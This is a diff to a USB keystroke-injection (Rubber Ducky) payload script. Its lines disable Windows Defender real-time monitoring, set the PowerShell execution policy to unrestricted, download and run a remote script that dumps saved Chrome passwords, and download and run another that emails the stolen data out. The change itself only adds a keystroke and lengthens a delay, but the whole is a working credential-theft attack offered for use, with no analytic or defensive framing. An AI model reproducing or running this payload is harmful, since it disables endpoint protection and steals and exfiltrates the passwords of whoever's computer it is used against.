@@ -26,6 +26,7 @@ STRING Set-MpPreference -DisableRealtimeMonitoring $true
 ENTER
 DELAY 1500
 STRING set-executionpolicy unrestricted
+ENTER
 DELAY 500
 REM  ** dump passwords using a modified version of "xxx" **
 STRING IEX (New-Object Net.WebClient).DownloadString('Location of chrome dump .ps1')
@@ -34,7 +35,7 @@ DELAY 5000
 REM  ** time to send an email **
 STRING IEX (New-Object Net.WebClient).DownloadString('location of email .ps1')
 ENTER
-DELAY 1500
+DELAY 2000
 STRING exit
 ENTER
 DELAY 250
